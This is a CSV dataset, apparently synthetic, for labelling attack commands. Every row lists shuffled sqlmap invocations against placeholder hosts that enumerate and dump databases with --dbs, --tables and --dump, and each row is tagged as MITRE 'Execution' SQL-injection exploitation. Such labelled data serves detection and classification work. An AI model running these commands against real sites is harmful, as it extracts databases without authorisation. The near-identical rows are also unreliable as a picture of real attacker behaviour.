command_list,tool,mitre_stage,intent,category
"sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u https://target.local --batch	 sqlmap -u http://example.com/login.php --tables	 sqlmap -u http://example.com/login.php --dump	 sqlmap -u http://example.com/login.php --dbs",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://intranet.local/page.php?id=5 --dbs	 sqlmap -u http://intranet.local/page.php?id=5 --batch	 sqlmap -u http://example.com/login.php --tables	 sqlmap -u http://example.com/login.php --dump	 sqlmap -u http://intranet.local/page.php?id=5",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://test.com?id=1 --tables	 sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u https://target.local --batch	 sqlmap -u https://target.local --dbs	 sqlmap -u http://test.com?id=1 --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://test.com?id=1 --dump	 sqlmap -u https://target.local --batch	 sqlmap -u http://test.com?id=1	 sqlmap -u https://target.local --dbs	 sqlmap -u https://target.local --tables",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://test.com?id=1 --tables	 sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u https://target.local --batch	 sqlmap -u https://target.local --dbs	 sqlmap -u https://target.local --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u https://target.local --tables	 sqlmap -u http://intranet.local/page.php?id=5 --dbs	 sqlmap -u http://intranet.local/page.php?id=5 --dump	 sqlmap -u http://test.com?id=1 --batch	 sqlmap -u http://test.com?id=1",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://example.com/login.php	 sqlmap -u http://test.com?id=1 --tables	 sqlmap -u https://target.local --batch	 sqlmap -u https://target.local --dbs	 sqlmap -u http://example.com/login.php --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://example.com/login.php --dump	 sqlmap -u https://target.local --batch	 sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u http://intranet.local/page.php?id=5 --dbs	 sqlmap -u http://test.com?id=1 --tables",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://test.com?id=1 --batch	 sqlmap -u https://target.local --dbs	 sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u http://test.com?id=1 --dump	 sqlmap -u http://example.com/login.php --tables",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u https://target.local --tables	 sqlmap -u http://test.com?id=1 --batch	 sqlmap -u http://test.com?id=1 --dbs	 sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u http://example.com/login.php --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://example.com/login.php --tables	 sqlmap -u http://intranet.local/page.php?id=5 --dump	 sqlmap -u https://target.local --batch	 sqlmap -u https://target.local --dbs	 sqlmap -u http://example.com/login.php",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://test.com?id=1	 sqlmap -u http://test.com?id=1 --dbs	 sqlmap -u http://test.com?id=1 --batch	 sqlmap -u http://intranet.local/page.php?id=5 --tables	 sqlmap -u https://target.local --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://example.com/login.php --tables	 sqlmap -u https://target.local --dump	 sqlmap -u http://test.com?id=1 --dbs	 sqlmap -u http://intranet.local/page.php?id=5 --batch	 sqlmap -u http://intranet.local/page.php?id=5",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://test.com?id=1 --dbs	 sqlmap -u http://intranet.local/page.php?id=5 --batch	 sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u https://target.local --dump	 sqlmap -u http://example.com/login.php --tables",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://intranet.local/page.php?id=5 --dump	 sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u http://example.com/login.php --dbs	 sqlmap -u https://target.local --batch	 sqlmap -u http://example.com/login.php --tables",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://intranet.local/page.php?id=5 --tables	 sqlmap -u http://example.com/login.php --batch	 sqlmap -u http://test.com?id=1 --dump	 sqlmap -u https://target.local	 sqlmap -u https://target.local --dbs",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://example.com/login.php --tables	 sqlmap -u http://test.com?id=1	 sqlmap -u http://intranet.local/page.php?id=5 --batch	 sqlmap -u http://intranet.local/page.php?id=5 --dump	 sqlmap -u http://test.com?id=1 --dbs",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://intranet.local/page.php?id=5 --batch	 sqlmap -u http://test.com?id=1	 sqlmap -u http://example.com/login.php --dbs	 sqlmap -u http://intranet.local/page.php?id=5 --tables	 sqlmap -u https://target.local --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://intranet.local/page.php?id=5 --dump	 sqlmap -u http://intranet.local/page.php?id=5 --batch	 sqlmap -u https://target.local --dbs	 sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u http://test.com?id=1 --tables",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u https://target.local --dbs	 sqlmap -u http://test.com?id=1	 sqlmap -u http://intranet.local/page.php?id=5 --dump	 sqlmap -u http://intranet.local/page.php?id=5 --tables	 sqlmap -u http://test.com?id=1 --batch",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://test.com?id=1 --batch	 sqlmap -u https://target.local --dump	 sqlmap -u http://test.com?id=1 --dbs	 sqlmap -u https://target.local	 sqlmap -u http://intranet.local/page.php?id=5 --tables",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://intranet.local/page.php?id=5 --dump	 sqlmap -u http://test.com?id=1 --tables	 sqlmap -u http://example.com/login.php	 sqlmap -u http://test.com?id=1 --dbs	 sqlmap -u http://intranet.local/page.php?id=5 --batch",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://example.com/login.php --batch	 sqlmap -u https://target.local --dbs	 sqlmap -u http://example.com/login.php --dump	 sqlmap -u https://target.local --tables	 sqlmap -u http://test.com?id=1",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://example.com/login.php --dump	 sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u http://intranet.local/page.php?id=5 --dbs	 sqlmap -u http://test.com?id=1 --batch	 sqlmap -u https://target.local --tables",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u https://target.local --dbs	 sqlmap -u http://example.com/login.php --tables	 sqlmap -u http://intranet.local/page.php?id=5 --dump	 sqlmap -u https://target.local --batch	 sqlmap -u https://target.local",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://test.com?id=1	 sqlmap -u http://test.com?id=1 --tables	 sqlmap -u http://intranet.local/page.php?id=5 --dbs	 sqlmap -u http://intranet.local/page.php?id=5 --dump	 sqlmap -u http://test.com?id=1 --batch",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://example.com/login.php --batch	 sqlmap -u http://intranet.local/page.php?id=5 --tables	 sqlmap -u http://example.com/login.php --dbs	 sqlmap -u http://intranet.local/page.php?id=5 --dump	 sqlmap -u http://intranet.local/page.php?id=5",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u https://target.local	 sqlmap -u https://target.local --dbs	 sqlmap -u http://example.com/login.php --batch	 sqlmap -u http://intranet.local/page.php?id=5 --tables	 sqlmap -u http://example.com/login.php --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u https://target.local --dump	 sqlmap -u http://example.com/login.php	 sqlmap -u http://test.com?id=1 --batch	 sqlmap -u http://example.com/login.php --tables	 sqlmap -u http://intranet.local/page.php?id=5 --dbs",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u http://test.com?id=1 --batch	 sqlmap -u http://intranet.local/page.php?id=5 --dbs	 sqlmap -u https://target.local --tables	 sqlmap -u https://target.local --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u https://target.local --tables	 sqlmap -u http://test.com?id=1 --dbs	 sqlmap -u http://test.com?id=1 --batch	 sqlmap -u https://target.local	 sqlmap -u http://test.com?id=1 --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://intranet.local/page.php?id=5 --dump	 sqlmap -u http://test.com?id=1	 sqlmap -u https://target.local --tables	 sqlmap -u http://test.com?id=1 --batch	 sqlmap -u https://target.local --dbs",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://test.com?id=1	 sqlmap -u http://example.com/login.php --tables	 sqlmap -u https://target.local --dbs	 sqlmap -u https://target.local --batch	 sqlmap -u http://example.com/login.php --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://intranet.local/page.php?id=5 --tables	 sqlmap -u http://intranet.local/page.php?id=5 --batch	 sqlmap -u http://test.com?id=1 --dump	 sqlmap -u http://example.com/login.php	 sqlmap -u http://intranet.local/page.php?id=5 --dbs",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u https://target.local --dump	 sqlmap -u https://target.local --tables	 sqlmap -u http://intranet.local/page.php?id=5 --batch	 sqlmap -u http://test.com?id=1	 sqlmap -u https://target.local --dbs",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://test.com?id=1 --batch	 sqlmap -u http://example.com/login.php --tables	 sqlmap -u http://example.com/login.php	 sqlmap -u https://target.local --dbs	 sqlmap -u https://target.local --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://example.com/login.php --tables	 sqlmap -u http://intranet.local/page.php?id=5 --dump	 sqlmap -u https://target.local --dbs	 sqlmap -u http://test.com?id=1	 sqlmap -u https://target.local --batch",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u https://target.local	 sqlmap -u https://target.local --dbs	 sqlmap -u http://test.com?id=1 --batch	 sqlmap -u http://example.com/login.php --dump	 sqlmap -u http://test.com?id=1 --tables",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u http://test.com?id=1 --dump	 sqlmap -u http://test.com?id=1 --dbs	 sqlmap -u http://test.com?id=1 --batch	 sqlmap -u http://example.com/login.php --tables",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://intranet.local/page.php?id=5 --batch	 sqlmap -u http://intranet.local/page.php?id=5 --dump	 sqlmap -u http://test.com?id=1 --dbs	 sqlmap -u http://intranet.local/page.php?id=5 --tables	 sqlmap -u http://example.com/login.php",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://example.com/login.php --batch	 sqlmap -u https://target.local	 sqlmap -u http://intranet.local/page.php?id=5 --dump	 sqlmap -u http://test.com?id=1 --tables	 sqlmap -u http://test.com?id=1 --dbs",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://intranet.local/page.php?id=5 --tables	 sqlmap -u http://intranet.local/page.php?id=5 --dbs	 sqlmap -u http://intranet.local/page.php?id=5 --batch	 sqlmap -u http://test.com?id=1	 sqlmap -u https://target.local --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://example.com/login.php --dump	 sqlmap -u http://test.com?id=1 --batch	 sqlmap -u http://test.com?id=1 --tables	 sqlmap -u http://test.com?id=1	 sqlmap -u https://target.local --dbs",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://test.com?id=1 --batch	 sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u https://target.local --dump	 sqlmap -u http://intranet.local/page.php?id=5 --dbs	 sqlmap -u http://test.com?id=1 --tables",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u https://target.local --batch	 sqlmap -u http://example.com/login.php --tables	 sqlmap -u http://test.com?id=1 --dump	 sqlmap -u https://target.local --dbs	 sqlmap -u https://target.local",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://test.com?id=1 --dump	 sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u http://intranet.local/page.php?id=5 --dbs	 sqlmap -u https://target.local --tables	 sqlmap -u https://target.local --batch",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://intranet.local/page.php?id=5 --tables	 sqlmap -u http://test.com?id=1	 sqlmap -u http://example.com/login.php --batch	 sqlmap -u http://example.com/login.php --dbs	 sqlmap -u http://test.com?id=1 --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u http://test.com?id=1 --tables	 sqlmap -u https://target.local --batch	 sqlmap -u http://example.com/login.php --dbs	 sqlmap -u https://target.local --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u https://target.local --tables	 sqlmap -u https://target.local --dbs	 sqlmap -u http://test.com?id=1 --dump	 sqlmap -u https://target.local --batch	 sqlmap -u http://example.com/login.php",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://test.com?id=1 --dbs	 sqlmap -u http://example.com/login.php --dump	 sqlmap -u http://example.com/login.php	 sqlmap -u http://test.com?id=1 --batch	 sqlmap -u http://example.com/login.php --tables",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://test.com?id=1 --dump	 sqlmap -u http://intranet.local/page.php?id=5 --dbs	 sqlmap -u https://target.local --tables	 sqlmap -u http://intranet.local/page.php?id=5 --batch	 sqlmap -u http://test.com?id=1",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u http://example.com/login.php --dbs	 sqlmap -u http://test.com?id=1 --tables	 sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u http://example.com/login.php --dump	 sqlmap -u http://example.com/login.php --batch",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u https://target.local --batch	 sqlmap -u http://intranet.local/page.php?id=5 --tables	 sqlmap -u https://target.local --dump	 sqlmap -u https://target.local --dbs	 sqlmap -u https://target.local",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
"sqlmap -u https://target.local --tables	 sqlmap -u https://target.local --dbs	 sqlmap -u http://intranet.local/page.php?id=5	 sqlmap -u http://example.com/login.php --batch	 sqlmap -u http://intranet.local/page.php?id=5 --dump",sqlmap,Execution,Exploit SQL injection vulnerabilities,SQL Injection Exploitation
